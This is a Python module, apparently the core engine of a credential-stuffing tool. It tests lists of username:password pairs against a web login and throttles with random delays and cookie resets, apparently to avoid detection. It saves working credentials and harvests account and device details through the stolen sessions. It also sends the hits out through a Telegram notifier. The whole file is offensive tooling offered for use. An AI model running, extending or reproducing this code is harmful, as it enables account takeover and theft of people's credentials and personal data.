"""Orchestrator."""
from __future__ import annotations
import asyncio
import json
import random
from pathlib import Path
from typing import Callable, Optional

from . import info_extract
from .web_login import WebLogin


def _parse_result(raw: str) -> tuple[str, str]:
    status = "Unknown"
    try:
        j = json.loads(raw)
        if "message" in j: status = str(j["message"])
        if isinstance(j.get("data"), dict) and "name" in j["data"]:
            status = f"{status} | {j['data']['name']}"
    except Exception:
        status = "Parse Error"
    return ("VALID" if "Error_Success" in raw else "INVALID"), status


class Engine:
    def __init__(self, accounts, out_dir: Path, telegram=None,
                 devices_file: Optional[str] = None,
                 notify: Optional[Callable[[dict], None]] = None):
        self.accounts = accounts
        self.out_dir = out_dir
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.telegram = telegram
        self.devices_file = devices_file
        self.notify = notify or (lambda _e: None)
        self.valid_count = self.invalid_count = self.error_count = self.waf_count = 0
        self._running = True

    def _emit(self, **ev) -> None:
        try: self.notify(ev)
        except Exception: pass

    def stop(self) -> None: self._running = False

    async def run(self) -> None:
        web = WebLogin()
        await web.start()
        self._emit(type="start", total=len(self.accounts))
        try:
            for i, (user, pw) in enumerate(self.accounts):
                if not self._running:
                    break
                self._emit(type="account_start", index=i + 1,
                           total=len(self.accounts), account=user)

                if i > 0 and i % 5 == 0:
                    try:
                        await web._ctx.clear_cookies()
                        await web._ensure_on_login()
                    except Exception: pass

                try:
                    raw = await web.try_login(user, pw)
                except Exception as e:
                    self.error_count += 1
                    self._emit(type="account_done", account=user, label="ERROR",
                               status=str(e))
                    await asyncio.sleep(2.0)
                    continue

                if not raw:
                    self.error_count += 1
                    self._emit(type="account_done", account=user, label="ERROR",
                               status="timeout")
                else:
                    label, status = _parse_result(raw)
                    if label == "VALID":
                        self.valid_count += 1
                        self._save_valid(user, pw)
                        info_line = ""
                        try:
                            guid = session = None
                            j = json.loads(raw)
                            guid    = j.get("guid")    or (j.get("data") or {}).get("guid")
                            session = j.get("session") or (j.get("data") or {}).get("session")
                            if guid and session:
                                info = await asyncio.to_thread(
                                    info_extract.fetch, int(guid), session, self.devices_file)
                                if info:
                                    info_line = info_extract.format_pipe(info)
                                    self._save_valid_full(user, pw, info)
                                    if self.telegram:
                                        await asyncio.to_thread(
                                            self.telegram.push_valid, user, pw, info_line)
                        except Exception as e:
                            self._emit(type="info_error", account=user, error=str(e))
                        self._emit(type="account_done", account=user, label="VALID",
                                   password=pw, status=status, info=info_line)
                    else:
                        self.invalid_count += 1
                        self._emit(type="account_done", account=user, label="INVALID",
                                   status=status)

                await asyncio.sleep(3.0 + random.random() * 8.0)
        finally:
            await web.stop()
            self._emit(type="done", valid=self.valid_count, invalid=self.invalid_count,
                       errors=self.error_count, stopped=not self._running)

    def _save_valid(self, user, pw) -> None:
        with open(self.out_dir / "valid.txt", "a", encoding="utf-8") as f:
            f.write(f"{user}:{pw}\n")

    def _save_valid_full(self, user, pw, info) -> None:
        with open(self.out_dir / "valid_full.txt", "a", encoding="utf-8") as f:
            f.write(f"{user}:{pw} | {info_extract.format_pipe(info)}\n")